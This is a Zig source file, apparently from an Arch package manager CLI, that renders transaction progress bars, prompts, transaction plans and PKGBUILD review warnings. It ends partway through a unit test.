const std = @import("std");
const Zigalpm = @import("Zigalpm");
const config_manager = @import("../config/manager.zig");
const config_model = @import("../config/model.zig");
const output_config = @import("config.zig");
const colors = @import("colors.zig");
const Color = colors.Color;
const fmt = @import("format.zig");
const review_output = @import("review.zig");
const terminal = @import("terminal.zig");
const runtime = @import("../runtime/context.zig");
const parser = @import("../cli/parser.zig");

const SizeDisplay = fmt.SizeDisplay;

const ProgressStyle = enum {
    blocks,
    pacman,
};

const Settings = struct {
    size_display: SizeDisplay = .megabytes,
    progress_style: ProgressStyle = .blocks,
    bar_width: usize = 20,
};

const Bar = struct {
    operation_id: u64,
    name: []const u8,
    action: []const u8,
    current: f64,
    total: f64,
    percentage: u8,
};

const FinalizedBar = struct {
    operation_id: u64,
    name: []const u8,
    action: []const u8,
};

const ProgressLayout = struct {
    label_width: usize,
    gap_width: usize,
    bar_width: usize,
};

const percentage_width: usize = 5;
const baseline_terminal_width: usize = 80;
const minimum_label_width: usize = 12;

/// Runs a backend operation through the common non-UI lifecycle. Package
/// commands only supply their opening message and runner; event rendering,
/// prompts, errors, flushing, and the final transaction result stay identical
/// across ALPM, AUR, Flatpak, AppImage, local, and download commands.
/// The runner must expose
/// `run(context: *runtime.RuntimeContext, operation_context: *Zigalpm.OperationContext, invocation: *const parser.Invocation) anyerror!void`.
pub fn output(
    context: *runtime.RuntimeContext,
    opening_message: []const u8,
    no_confirm: bool,
    runner: anytype,
    invocation: *const parser.Invocation,
    success_message: ?[]const u8,
    failure_message: ?[]const u8,
) anyerror!bool {
    var operation_context = Zigalpm.OperationContext.init(context.allocator, context.io);
    context.attachTransactionLog(&operation_context);
    defer operation_context.deinit();
    var renderer = try Renderer.init(context, no_confirm);
    defer renderer.deinit();
    try renderer.attach(&operation_context);

    try renderer.begin(opening_message);
    runner.run(context, &operation_context, invocation) catch |err| {
        if (err == error.Cancelled) {
            try renderer.finishCancelled();
            return true;
        }
        if (renderer.reported_failure.load(.acquire)) {
            try renderer.reportTechnicalDetails(err);
            try renderer.finishWithMessage(false, failure_message);
            return false;
        }
        const message = try Zigalpm.user_errors.format(context.allocator, err, .{
            .subject = if (invocation.positionals.len == 1) invocation.positionals[0] else null,
        });
        defer context.allocator.free(message);
        try renderer.reportError(message);
        try renderer.finishWithMessage(false, failure_message);
        return false;
    };

    try renderer.finishWithMessage(true, success_message);
    return !renderer.failed();
}

/// Backend-neutral non-UI operation renderer. Any command using the shared
/// OperationContext can attach this renderer and receive the same single-pane
/// transaction output as StandardSinglePaneOutput in the C# CLI.
pub const Renderer = struct {
    context: *runtime.RuntimeContext,
    settings: Settings,
    no_confirm: bool,
    animate: bool,
    operation_context: ?*Zigalpm.OperationContext = null,
    subscription: ?u64 = null,
    mutex: std.Io.Mutex = .init,
    owned_data: std.heap.ArenaAllocator,
    bars: std.ArrayList(Bar) = .empty,
    finalized: std.ArrayList(FinalizedBar) = .empty,
    emitted_retrieving: bool = false,
    frame: usize = 0,
    write_failed: std.atomic.Value(bool) = .init(false),
    reported_failure: std.atomic.Value(bool) = .init(false),

    pub fn init(
        context: *runtime.RuntimeContext,
        no_confirm: bool,
    ) !Renderer {
        return .{
            .context = context,
            .settings = try loadSettings(context),
            .no_confirm = no_confirm,
            .animate = context.stdout_is_tty and output_config.supportsAnsi(context),
            .owned_data = std.heap.ArenaAllocator.init(context.allocator),
        };
    }

    pub fn attach(self: *Renderer, operation_context: *Zigalpm.OperationContext) !void {
        std.debug.assert(self.operation_context == null);
        self.operation_context = operation_context;
        self.subscription = try operation_context.subscribe(.{
            .function = handleEvent,
            .data = self,
        });
        operation_context.setQuestionHandler(.{
            .function = handleQuestion,
            .data = self,
        });
    }

    pub fn detach(self: *Renderer) void {
        const operation_context = self.operation_context orelse return;
        operation_context.setQuestionHandler(null);
        if (self.subscription) |subscription| {
            _ = operation_context.unsubscribe(subscription);
            self.subscription = null;
        }
        self.operation_context = null;
    }

    pub fn deinit(self: *Renderer) void {
        self.detach();
        self.bars.deinit(self.context.allocator);
        self.finalized.deinit(self.context.allocator);
        self.owned_data.deinit();
    }

    pub fn begin(self: *Renderer, message: []const u8) !void {
        self.mutex.lockUncancelable(self.context.io);
        defer self.mutex.unlock(self.context.io);
        try self.writeColoredLine(.white, ":: {s}", .{message});
        try self.flush();
    }

    pub fn finish(self: *Renderer, success: bool) !void {
        return self.finishWithMessage(success, null);
    }

    pub fn finishWithMessage(
        self: *Renderer,
        success: bool,
        message: ?[]const u8,
    ) !void {
        self.mutex.lockUncancelable(self.context.io);
        defer self.mutex.unlock(self.context.io);
        try self.clearBars();
        self.bars.clearRetainingCapacity();
        if (success) {
            if (message) |value|
                try self.writeColoredLine(.green, ":: {s}", .{value})
            else
                try self.writeColoredLine(.green, ":: Transaction complete.", .{});
        } else {
            if (message) |value|
                try self.writeColoredLine(.red, ":: {s}", .{value})
            else
                try self.writeColoredLine(.red, ":: Transaction failed.", .{});
        }
        try self.flush();
    }

    pub fn reportError(self: *Renderer, message: []const u8) !void {
        self.mutex.lockUncancelable(self.context.io);
        defer self.mutex.unlock(self.context.io);
        try self.writeColoredLine(.red, "error: {s}", .{message});
        try self.flush();
    }

    pub fn reportTechnicalDetails(self: *Renderer, err: anyerror) !void {
        self.mutex.lockUncancelable(self.context.io);
        defer self.mutex.unlock(self.context.io);
        try self.writeColoredLine(.white, "Technical details: {t}", .{err});
        try self.flush();
    }

    pub fn finishCancelled(self: *Renderer) !void {
        self.mutex.lockUncancelable(self.context.io);
        defer self.mutex.unlock(self.context.io);
        try self.clearBars();
        self.bars.clearRetainingCapacity();
        try self.writeColoredLine(.yellow, ":: Operation cancelled.", .{});
        try self.flush();
    }

    pub fn failed(self: *const Renderer) bool {
        return self.write_failed.load(.acquire);
    }

    fn handleEvent(data: ?*anyopaque, event: Zigalpm.OperationEvent) void {
        const self: *Renderer = @ptrCast(@alignCast(data.?));
        self.mutex.lockUncancelable(self.context.io);
        defer self.mutex.unlock(self.context.io);
        self.writeEvent(event) catch self.write_failed.store(true, .release);
    }

    fn writeEvent(self: *Renderer, event: Zigalpm.OperationEvent) !void {
        switch (event) {
            .progress => |progress| try self.writeProgress(progress),
            .status => |status| try self.writeStatus(status),
            .failure => |failure| {
                const message = try Zigalpm.user_errors.format(self.context.allocator, failure.err, .{
                    .subject = failure.envelope.subject,
                    .detail = failure.message,
                });
                defer self.context.allocator.free(message);
                if (failure.recoverable) {
                    try self.writeColoredLine(.yellow, "warning: {s}", .{message});
                } else {
                    try self.writeColoredLine(.red, "error: {s}", .{message});
                    self.reported_failure.store(true, .release);
                }
            },
            .completed => |completed| try self.completeOperation(completed.envelope.operation_id),
            .started => {},
        }
        try self.flush();
    }

    fn writeStatus(self: *Renderer, status: anytype) !void {
        const code = status.code orelse "";
        if (std.mem.eql(u8, code, "alpm.scriptlet")) {
            const line = std.mem.trimEnd(u8, status.message, " \t\r\n");
            if (line.len == 0) {
                try self.writeColoredLine(.magenta, "Running scriptlet...", .{});
            } else {
                try self.writeColoredLine(.magenta, "Scriptlet: {s}", .{line});
            }
        } else if (std.mem.eql(u8, code, "alpm.pacnew")) {
            try self.writeColoredLine(.yellow, ":: pacnew stored @ {s}{s}", .{
                status.message,
                if (std.mem.endsWith(u8, status.message, ".pacnew")) "" else ".pacnew",
            });
        } else if (std.mem.eql(u8, code, "alpm.pacsave")) {
            try self.writeColoredLine(.yellow, ":: pacsave stored @ {s}{s}", .{
                status.message,
                if (std.mem.endsWith(u8, status.message, ".pacsave")) "" else ".pacsave",
            });
        } else if (std.mem.eql(u8, code, "alpm.replaces")) {
            try self.writeColoredLine(.white, ":: {s}", .{status.message});
        } else if (std.mem.startsWith(u8, code, "download.")) {
            // Progress events already communicate the download lifecycle. The
            // separate started/completed status messages are redundant.
            return;
        } else if (std.mem.startsWith(u8, code, "alpm.")) {
            // StandardSinglePaneOutput intentionally does not echo libalpm's
            // general informational event stream.
            return;
        } else if (status.message.len > 0) {
            const color: Color = switch (status.level) {
                .debug => .gray,
                .information => .white,
                .warning => .yellow,
                .success => .green,
            };
            try self.writeColoredLine(color, "{s}", .{status.message});
        }
    }

    fn writeProgress(self: *Renderer, progress: anytype) !void {
        const update = progress.update;
        if (update.stage) |stage| {
            // AUR RPC and cgit responses are metadata requests, not package
            // downloads. They are commonly chunked without a Content-Length,
            // so exposing them as download bars produces a misleading 0/0
            // PackageDownload entry.
            if (std.mem.eql(u8, stage, "aur-http")) return;
            if (std.mem.eql(u8, stage, "hook")) {
                const line = update.message orelse "";
                if (line.len == 0) {
                    try self.writeColoredLine(.magenta, "Running hook...", .{});
                } else {
                    try self.writeColoredLine(.magenta, "Hook: {s}", .{line});
                }
                return;
            }
            // The downloader publishes a richer child event for sync downloads;
            // suppress the duplicate legacy ALPM transaction progress event.
            if (progress.envelope.kind == .sync and
                progress.envelope.backend == .alpm and
                std.mem.eql(u8, stage, "transaction")) return;
        }

        const action = progressAction(progress);
        const is_download = progress.envelope.backend == .download or
            (update.stage != null and startsWithIgnoreCase(update.stage.?, "download"));
        if (is_download and !self.emitted_retrieving) {
            self.emitted_retrieving = true;
            try self.writeColoredLine(.white, ":: Retrieving packages...", .{});
        }

        const subject = update.message orelse progress.envelope.subject orelse "unknown";
        const name = try self.progressDisplayName(progress.envelope.backend, subject);
        const percentage_count: u64 = if (update.percentage) |percentage|
            @intFromFloat(std.math.clamp(percentage, 0, 100))
        else
            0;
        const raw_current = update.bytes_completed orelse update.completed orelse percentage_count;
        const raw_total = update.bytes_total orelse update.total orelse if (update.percentage != null) @as(u64, 100) else 0;
        const has_byte_counts = update.bytes_completed != null or update.bytes_total != null;
        const current = if (has_byte_counts) convertSize(self.settings.size_display, raw_current) else @as(f64, @floatFromInt(raw_current));
        const total = if (has_byte_counts) convertSize(self.settings.size_display, raw_total) else @as(f64, @floatFromInt(raw_total));
        const percentage = progressPercentage(update, raw_current, raw_total);
        try self.updateBar(.{
            .operation_id = progress.envelope.operation_id,
            .name = name,
            .action = action,
            .current = current,
            .total = total,
            .percentage = percentage,
        });
    }

    fn updateBar(self: *Renderer, bar: Bar) !void {
        if (!self.animate) {
            if (bar.percentage < 100 or self.wasFinalized(bar.operation_id, bar.name, bar.action)) return;
            try self.appendFinalized(bar.operation_id, bar.name, bar.action);
            try self.writeBarLine(bar);
            return;
        }

        try self.clearBars();
        var found: ?usize = null;
        for (self.bars.items, 0..) |candidate, index| {
            if (candidate.operation_id == bar.operation_id and
                std.mem.eql(u8, candidate.name, bar.name))
            {
                found = index;
                break;
            }
        }
        if (bar.percentage >= 100) {
            if (!self.wasFinalized(bar.operation_id, bar.name, bar.action)) {
                try self.writeBarLine(bar);
                try self.appendFinalized(bar.operation_id, bar.name, bar.action);
            }
            if (found) |index| _ = self.bars.orderedRemove(index);
        } else if (found) |index| {
            self.bars.items[index].current = bar.current;
            self.bars.items[index].total = bar.total;
            self.bars.items[index].percentage = bar.percentage;
            if (!std.mem.eql(u8, self.bars.items[index].action, bar.action)) {
                self.bars.items[index].action = try self.owned_data.allocator().dupe(u8, bar.action);
            }
        } else {
            try self.bars.append(self.context.allocator, try self.ownedBar(bar));
        }
        self.frame +%= 1;
        try self.drawBars();
    }

    fn ownedBar(self: *Renderer, bar: Bar) !Bar {
        const allocator = self.owned_data.allocator();
        return .{
            .operation_id = bar.operation_id,
            .name = try allocator.dupe(u8, bar.name),
            .action = try allocator.dupe(u8, bar.action),
            .current = bar.current,
            .total = bar.total,
            .percentage = bar.percentage,
        };
    }

    fn progressDisplayName(
        self: *Renderer,
        backend: Zigalpm.OperationBackend,
        subject: []const u8,
    ) ![]const u8 {
        if (backend != .flatpak) return std.fs.path.basename(subject);
        return formatFlatpakRef(self.owned_data.allocator(), subject);
    }

    fn appendFinalized(self: *Renderer, operation_id: u64, name: []const u8, action: []const u8) !void {
        const allocator = self.owned_data.allocator();
        try self.finalized.append(self.context.allocator, .{
            .operation_id = operation_id,
            .name = try allocator.dupe(u8, name),
            .action = try allocator.dupe(u8, action),
        });
    }

    fn wasFinalized(self: *const Renderer, operation_id: u64, name: []const u8, action: []const u8) bool {
        for (self.finalized.items) |item| {
            if (item.operation_id == operation_id and
                std.mem.eql(u8, item.name, name) and
                std.mem.eql(u8, item.action, action)) return true;
        }
        return false;
    }

    fn completeOperation(self: *Renderer, operation_id: u64) !void {
        if (!self.animate) return;
        var has_bars = false;
        for (self.bars.items) |bar| {
            if (bar.operation_id == operation_id) {
                has_bars = true;
                break;
            }
        }
        if (!has_bars) return;

        try self.clearBars();
        var index: usize = 0;
        while (index < self.bars.items.len) {
            if (self.bars.items[index].operation_id == operation_id) {
                _ = self.bars.orderedRemove(index);
            } else {
                index += 1;
            }
        }
        try self.drawBars();
    }

    fn clearBars(self: *Renderer) !void {
        if (!self.animate) return;
        for (self.bars.items) |_| try self.context.stdout.writeAll("\x1b[1A\x1b[2K");
        if (self.bars.items.len > 0) try self.context.stdout.writeByte('\r');
    }

    fn drawBars(self: *Renderer) !void {
        if (!self.animate) return;
        for (self.bars.items) |bar| try self.writeBarLine(bar);
    }

    fn writeBarLine(self: *Renderer, bar: Bar) !void {
        const width = terminalWidth(self.context);
        const layout = progressLayout(width, self.settings.bar_width);

        var left_buffer = std.Io.Writer.Allocating.init(self.context.allocator);
        defer left_buffer.deinit();
        try left_buffer.writer.print("({d:.0}/{d:.0}) {s} {s}", .{ bar.current, bar.total, bar.action, bar.name });
        const left = terminalPrefix(left_buffer.writer.buffered(), layout.label_width);

        try self.context.stdout.writeAll(left.bytes);
        try self.context.stdout.splatByteAll(' ', layout.label_width - left.columns + layout.gap_width);
        try renderBar(
            self.context.stdout,
            bar.percentage,
            self.frame,
            self.settings.progress_style,
            layout.bar_width,
            !self.animate,
        );
        try self.context.stdout.print(" {d: >3}%\n", .{bar.percentage});
    }

    fn writeColoredLine(self: *Renderer, color: Color, comptime format: []const u8, args: anytype) !void {
        if (self.animate) try self.clearBars();
        if (output_config.supportsAnsi(self.context)) try self.context.stdout.writeAll(colors.colorCode(color));
        try self.context.stdout.print(format, args);
        if (output_config.supportsAnsi(self.context)) try self.context.stdout.writeAll(colors.reset);
        try self.context.stdout.writeByte('\n');
        if (self.animate) try self.drawBars();
    }

    fn flush(self: *Renderer) !void {
        try self.context.stdout.flush();
        try self.context.stderr.flush();
    }

    fn handleQuestion(data: ?*anyopaque, question: Zigalpm.OperationQuestion) Zigalpm.OperationQuestionResponse {
        const self: *Renderer = @ptrCast(@alignCast(data.?));
        self.mutex.lockUncancelable(self.context.io);
        defer self.mutex.unlock(self.context.io);
        if (self.no_confirm) {
            if (question.kind == .confirm_transaction) {
                self.clearBars() catch self.write_failed.store(true, .release);
                self.renderTransactionPlan(question) catch self.write_failed.store(true, .release);
                self.drawBars() catch self.write_failed.store(true, .release);
                return .accepted;
            }
            if (question.kind == .review_changes) {
                if (hasSecurityFindings(question)) {
                    return self.askQuestion(question) catch {
                        self.write_failed.store(true, .release);
                        return defaultResponse(question);
                    };
                }
                self.clearBars() catch self.write_failed.store(true, .release);
                self.renderReview(question, false) catch self.write_failed.store(true, .release);
                self.drawBars() catch self.write_failed.store(true, .release);
                return safeReviewDefault(question);
            }
            return automaticResponse(question.kind);
        }
        return self.askQuestion(question) catch {
            self.write_failed.store(true, .release);
            return defaultResponse(question);
        };
    }

    fn askQuestion(self: *Renderer, question: Zigalpm.OperationQuestion) !Zigalpm.OperationQuestionResponse {
        try self.clearBars();
        defer self.drawBars() catch self.write_failed.store(true, .release);
        return switch (question.kind) {
            .confirmation => if (try self.confirm(question.prompt, true)) .accepted else .declined,
            .import_pgp_key => if (try self.confirm(question.prompt, false)) .accepted else .declined,
            .confirm_transaction => blk: {
                try self.renderTransactionPlan(question);
                const default_approved = defaultResponse(question) == .accepted;
                break :blk if (try self.confirm(question.prompt, default_approved)) .accepted else .declined;
            },
            .review_changes => blk: {
                try self.renderReview(question, true);
                const default_approved = safeReviewDefault(question) == .accepted;
                break :blk if (try self.confirm(question.prompt, default_approved)) .accepted else .declined;
            },
            .select_one, .select_provider => .{ .choice = try self.selectOne(question) },
            .select_many, .select_optional_dependencies => .{ .choices = try self.selectMany(question) },
        };
    }

    fn renderTransactionPlan(
        self: *Renderer,
        question: Zigalpm.OperationQuestion,
    ) !void {
        const plan = question.transaction_plan orelse return error.MissingTransactionPlan;
        try self.writeColoredLine(.cyan, "Packages to {s}:", .{@tagName(plan.action)});
        for (plan.packages) |package| {
            var download_buffer: [64]u8 = undefined;
            var installed_buffer: [64]u8 = undefined;
            const download = transactionSizeText(
                &download_buffer,
                self.settings.size_display,
                package.download_size,
                package.source,
            );
            const installed = transactionSizeText(
                &installed_buffer,
                self.settings.size_display,
                package.installed_size,
                package.source,
            );
            try self.writeColoredLine(.white, "  {s} {s} [{s}, {s}]", .{
                package.name,
                package.version orelse "version determined during build",
                transactionRoleName(package.role),
                transactionSourceName(package.source),
            });
            try self.writeColoredLine(.gray, "    download: {s}; installed: {s}", .{
                download,
                installed,
            });
        }
        if (plan.total_download_size) |size| {
            var buffer: [64]u8 = undefined;
            try self.writeColoredLine(.cyan, "Total download: {s}", .{
                transactionSizeText(&buffer, self.settings.size_display, size, .repository),
            });
        }
        if (plan.total_installed_size) |size| {
            var buffer: [64]u8 = undefined;
            try self.writeColoredLine(.cyan, "Total installed: {s}", .{
                transactionSizeText(&buffer, self.settings.size_display, size, .repository),
            });
        }
        if (plan.net_installed_size) |size| {
            var buffer: [64]u8 = undefined;
            const absolute: u64 = @abs(size);
            const value = transactionSizeText(&buffer, self.settings.size_display, absolute, .repository);
            try self.writeColoredLine(.cyan, "Net installed-size change: {s}{s}", .{
                if (size < 0) "-" else "+",
                value,
            });
        }
    }

    fn renderReview(
        self: *Renderer,
        question: Zigalpm.OperationQuestion,
        include_diff: bool,
    ) !void {
        const review = question.review orelse return error.MissingReviewPayload;
        if (include_diff) {
            const lines = try review_output.buildDiff(
                self.context.allocator,
                review.old_content,
                review.new_content,
            );
            defer self.context.allocator.free(lines);
            for (lines) |line| switch (line.kind) {
                .unchanged => try self.writeColoredLine(.white, "{s}", .{line.text}),
                .added => try self.writeColoredLine(.green, "+ {s}", .{line.text}),
                .removed => try self.writeColoredLine(.red, "- {s}", .{line.text}),
            };
        }

        if (review.findings.len > 0) {
            try self.writeColoredLine(
                .red,
                "PKGBUILD security warnings — these commands fetch/execute code outside pacman's control:",
                .{},
            );
            for (review.findings) |finding| {
                const color: Color = if (finding.severity == .critical) .red else .yellow;
                try self.writeColoredLine(color, "  • {s} used in {s}", .{
                    finding.tool,
                    finding.hook,
                });
                if (finding.message.len != 0)
                    try self.writeColoredLine(color, "    {s}", .{finding.message});
                try self.writeColoredLine(.gray, "    {s}", .{finding.matched_line});
            }
        }

        for (review.related_files) |file| {
            try self.writeColoredLine(.cyan, "Source file: {s}", .{file.name});
            try self.writeColoredLine(.yellow, "{s}", .{file.content});
        }
    }

    fn confirm(self: *Renderer, prompt: []const u8, default_value: bool) !bool {
        const reader = self.context.stdin orelse return default_value;
        while (true) {
            try self.context.stdout.print("{s} ({s}) ", .{ prompt, if (default_value) "Y/n" else "y/N" });
            try self.context.stdout.flush();
            const input = (try reader.takeDelimiter('\n')) orelse return default_value;
            const answer = std.mem.trim(u8, input, " \t\r\n");
            if (answer.len == 0) return default_value;
            if (std.ascii.eqlIgnoreCase(answer, "y") or std.ascii.eqlIgnoreCase(answer, "yes")) return true;
            if (std.ascii.eqlIgnoreCase(answer, "n") or std.ascii.eqlIgnoreCase(answer, "no")) return false;
            try self.context.stdout.writeAll("Please answer 'y' or 'n'.\n");
        }
    }

    fn selectOne(self: *Renderer, question: Zigalpm.OperationQuestion) !usize {
        if (question.options.len == 0 or self.context.stdin == null) return 0;
        try self.context.stdout.print("{s}\n", .{question.prompt});
        for (question.options, 0..) |option, index| {
            try self.context.stdout.print("  {d}) {s}\n", .{ index + 1, option.label });
        }
        while (true) {
            try self.context.stdout.print("Select [1-{d}] (1): ", .{question.options.len});
            try self.context.stdout.flush();
            const input = (try self.context.stdin.?.takeDelimiter('\n')) orelse return 0;
            const answer = std.mem.trim(u8, input, " \t\r\n");
            if (answer.len == 0) return 0;
            const selected = std.fmt.parseInt(usize, answer, 10) catch continue;
            if (selected >= 1 and selected <= question.options.len) return selected - 1;
        }
    }

    fn selectMany(self: *Renderer, question: Zigalpm.OperationQuestion) ![]const usize {
        if (question.options.len == 0 or self.context.stdin == null) return &.{};
        try self.context.stdout.print("{s}\n", .{question.prompt});
        for (question.options, 0..) |option, index| {
            const installed = if (option.is_installed) "Installed" else "Not Installed";
            try self.context.stdout.print("  {d}) {s} : {s} : {s}\n", .{ index + 1, option.label, option.description, installed });
        }
        try self.context.stdout.writeAll("Select numbers separated by commas (none): ");
        try self.context.stdout.flush();
        const input = (try self.context.stdin.?.takeDelimiter('\n')) orelse return &.{};
        const answer = std.mem.trim(u8, input, " \t\r\n");
        if (answer.len == 0) return &.{};
        var selected: std.ArrayList(usize) = .empty;
        const allocator = self.owned_data.allocator();
        var pieces = std.mem.splitScalar(u8, answer, ',');
        while (pieces.next()) |piece| {
            const number = std.fmt.parseInt(usize, std.mem.trim(u8, piece, " \t"), 10) catch continue;
            if (number >= 1 and number <= question.options.len) try selected.append(allocator, number - 1);
        }
        return selected.toOwnedSlice(allocator);
    }
};

fn loadSettings(context: *runtime.RuntimeContext) !Settings {
    const manager = config_manager.Manager.init(context);
    const config = manager.read() catch try config_model.Config.defaults(context.allocator);
    return .{
        .size_display = fmt.parseSizeDisplay(stringValue(&config, "FileSizeDisplay") orelse "Megabytes"),
        .progress_style = parseProgressStyle(stringValue(&config, "ProgressBarStyle") orelse "Blocks"),
        .bar_width = integerValue(&config, "ProgressBarWidth") orelse 20,
    };
}

fn stringValue(config: *const config_model.Config, key: []const u8) ?[]const u8 {
    const value = config.values.get(key) orelse return null;
    return if (value == .string) value.string else null;
}

fn integerValue(config: *const config_model.Config, key: []const u8) ?usize {
    const value = config.values.get(key) orelse return null;
    return switch (value) {
        .integer => |integer| if (integer > 0) @intCast(integer) else null,
        else => null,
    };
}

fn parseProgressStyle(value: []const u8) ProgressStyle {
    return if (std.ascii.eqlIgnoreCase(value, "Pacman")) .pacman else .blocks;
}

fn convertSize(display: SizeDisplay, bytes: u64) f64 {
    const divisor: f64 = switch (display) {
        .bytes => 1,
        .megabytes => 1024 * 1024,
        .gigabytes => 1024 * 1024 * 1024,
    };
    return @as(f64, @floatFromInt(bytes)) / divisor;
}

fn transactionSizeText(
    buffer: []u8,
    display: SizeDisplay,
    size: ?u64,
    source: Zigalpm.OperationTransactionPackageSource,
) []const u8 {
    const value = size orelse return if (source == .repository)
        "Resolved by standard transaction"
    else
        "Determined during build";
    return switch (display) {
        .bytes => std.fmt.bufPrint(buffer, "{d} B", .{value}) catch "?",
        .megabytes => std.fmt.bufPrint(buffer, "{d:.2} MiB", .{convertSize(.megabytes, value)}) catch "?",
        .gigabytes => std.fmt.bufPrint(buffer, "{d:.2} GiB", .{convertSize(.gigabytes, value)}) catch "?",
    };
}

fn transactionRoleName(role: Zigalpm.OperationTransactionPackageRole) []const u8 {
    return switch (role) {
        .requested => "requested",
        .dependency => "dependency",
        .runtime_dependency => "runtime dependency",
        .build_dependency => "build dependency",
        .check_dependency => "check dependency",
        .optional_dependency => "optional dependency",
    };
}

fn transactionSourceName(source: Zigalpm.OperationTransactionPackageSource) []const u8 {
    return switch (source) {
        .repository => "repository",
        .aur => "AUR",
        .local => "local",
    };
}

fn progressPercentage(update: anytype, current: u64, total: u64) u8 {
    if (update.percentage) |percentage| {
        if (percentage <= 0) return 0;
        if (percentage >= 100) return 100;
        return @intFromFloat(percentage);
    }
    if (total == 0) return 0;
    return @intCast(@min(@as(u64, 100), current * 100 / total));
}

fn progressAction(progress: anytype) []const u8 {
    if (progress.envelope.backend == .download) {
        const subject = progress.envelope.subject orelse "";
        return if (std.mem.endsWith(u8, subject, ".db") or std.mem.endsWith(u8, subject, ".db.sig"))
            "DatabaseDownload"
        else
            "PackageDownload";
    }
    if (progress.update.native_code) |native_code| {
        if (progress.envelope.backend == .alpm) return switch (native_code) {
            0 => "AddStart",
            1 => "UpgradeStart",
            2 => "DowngradeStart",
            3 => "ReinstallStart",
            4 => "RemoveStart",
            5 => "ConflictsStart",
            6 => "DiskspaceStart",
            7 => "IntegrityStart",
            8 => "LoadStart",
            9 => "KeyringStart",
            100 => "PackageDownload",
            101 => "DatabaseDownload",
            else => operationAction(progress.envelope.kind),
        };
        if (progress.envelope.backend == .aur) return switch (native_code) {
            200 => "MakepkgBuild",
            201 => "MakepkgPackage",
            202 => "AurDownload",
            else => operationAction(progress.envelope.kind),
        };
    }
    if (progress.update.stage) |stage| {
        if (!std.mem.eql(u8, stage, "transaction")) return stage;
    }
    return operationAction(progress.envelope.kind);
}

fn formatFlatpakRef(
    allocator: std.mem.Allocator,
    reference: []const u8,
) ![]const u8 {
    var parts = std.mem.splitScalar(u8, reference, '/');
    const kind = parts.next() orelse return reference;
    const id = parts.next() orelse return reference;
    const architecture = parts.next() orelse return reference;
    const branch = parts.next() orelse return reference;
    if (kind.len == 0 or id.len == 0 or architecture.len == 0 or
        branch.len == 0 or parts.next() != null)
        return reference;
    return std.fmt.allocPrint(
        allocator,
        "{s} ({s}, {s}, {s})",
        .{ id, branch, architecture, kind },
    );
}

fn operationAction(kind: Zigalpm.OperationKind) []const u8 {
    return switch (kind) {
        .install => "Install",
        .remove => "Remove",
        .update => "Update",
        .sync => "Sync",
        .search => "Search",
        .download => "Download",
        .build => "Build",
        .cleanup => "Cleanup",
        .inspect => "Inspect",
        .configure => "Configure",
        .launch => "Launch",
    };
}

fn startsWithIgnoreCase(value: []const u8, prefix: []const u8) bool {
    return value.len >= prefix.len and std.ascii.eqlIgnoreCase(value[0..prefix.len], prefix);
}

test "Flatpak progress references retain application identity and context" {
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();

    try std.testing.expectEqualStrings(
        "org.freedesktop.Platform (25.08, x86_64, runtime)",
        try formatFlatpakRef(
            arena.allocator(),
            "runtime/org.freedesktop.Platform/x86_64/25.08",
        ),
    );
    try std.testing.expectEqualStrings(
        "org.example.App",
        try formatFlatpakRef(arena.allocator(), "org.example.App"),
    );
}

fn terminalWidth(context: *const runtime.RuntimeContext) usize {
    return terminal.usableWidth(context, baseline_terminal_width, percentage_width);
}

fn progressLayout(terminal_width: usize, configured_bar_width: usize) ProgressLayout {
    const content_width = terminal_width -| percentage_width;
    if (content_width == 0) return .{ .label_width = 0, .gap_width = 0, .bar_width = 0 };
    if (content_width == 1) return .{ .label_width = 0, .gap_width = 0, .bar_width = 1 };

    const gap_width: usize = 1;
    const available = content_width - gap_width;
    // Terminal columns already reflect window resizing and font/DPI scaling.
    // Treat the configured width as its preference at 80 columns, then scale
    // it with the live cell count while preserving useful room for the label.
    const preferred = @max(
        @as(usize, 1),
        ((configured_bar_width *| terminal_width) +| baseline_terminal_width / 2) / baseline_terminal_width,
    );
    const maximum = if (available > minimum_label_width)
        available - minimum_label_width
    else
        @max(@as(usize, 1), available / 3);
    const bar_width = @min(preferred, maximum);
    return .{
        .label_width = available - bar_width,
        .gap_width = gap_width,
        .bar_width = bar_width,
    };
}

const TerminalPrefix = struct {
    bytes: []const u8,
    columns: usize,
};

fn terminalPrefix(value: []const u8, maximum_columns: usize) TerminalPrefix {
    var byte_index: usize = 0;
    var columns: usize = 0;
    while (byte_index < value.len and columns < maximum_columns) : (columns += 1) {
        const sequence_length = std.unicode.utf8ByteSequenceLength(value[byte_index]) catch 1;
        const length: usize = @intCast(sequence_length);
        if (byte_index + length > value.len) {
            byte_index += 1;
            continue;
        }
        _ = std.unicode.utf8Decode(value[byte_index..][0..length]) catch {
            byte_index += 1;
            continue;
        };
        byte_index += length;
    }
    return .{ .bytes = value[0..byte_index], .columns = columns };
}

test "single-pane progress layout scales with terminal width" {
    const narrow = progressLayout(39, 24);
    const baseline = progressLayout(79, 24);
    const wide = progressLayout(159, 24);

    try std.testing.expectEqual(@as(usize, 12), narrow.bar_width);
    try std.testing.expectEqual(@as(usize, 24), baseline.bar_width);
    try std.testing.expectEqual(@as(usize, 48), wide.bar_width);
    try std.testing.expectEqual(@as(usize, 39), narrow.label_width + narrow.gap_width + narrow.bar_width + percentage_width);
    try std.testing.expectEqual(@as(usize, 79), baseline.label_width + baseline.gap_width + baseline.bar_width + percentage_width);
    try std.testing.expectEqual(@as(usize, 159), wide.label_width + wide.gap_width + wide.bar_width + percentage_width);

    const configured = progressLayout(79, 32);
    try std.testing.expectEqual(@as(usize, 32), configured.bar_width);

    const tiny = progressLayout(6, 24);
    try std.testing.expectEqual(@as(usize, 6), tiny.label_width + tiny.gap_width + tiny.bar_width + percentage_width);
}

test "single-pane label truncation preserves UTF-8 boundaries" {
    const prefix = terminalPrefix("pkg-éclair", 6);
    try std.testing.expectEqualStrings("pkg-éc", prefix.bytes);
    try std.testing.expectEqual(@as(usize, 6), prefix.columns);
    try std.testing.expect(std.unicode.utf8ValidateSlice(prefix.bytes));
}

test "single-pane rendered progress line fits detected width" {
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    var stdout = std.Io.Writer.Allocating.init(std.testing.allocator);
    defer stdout.deinit();
    var stderr = std.Io.Writer.Allocating.init(std.testing.allocator);
    defer stderr.deinit();
    var environment = std.process.Environ.Map.init(arena.allocator());
    try environment.put("COLUMNS", "40");
    var context: runtime.RuntimeContext = .{
        .allocator = arena.allocator(),
        .io = std.testing.io,
        .stdout = &stdout.writer,
        .stderr = &stderr.writer,
        .environment = &environment,
    };
    var renderer: Renderer = .{
        .context = &context,
        .settings = .{ .bar_width = 24 },
        .no_confirm = true,
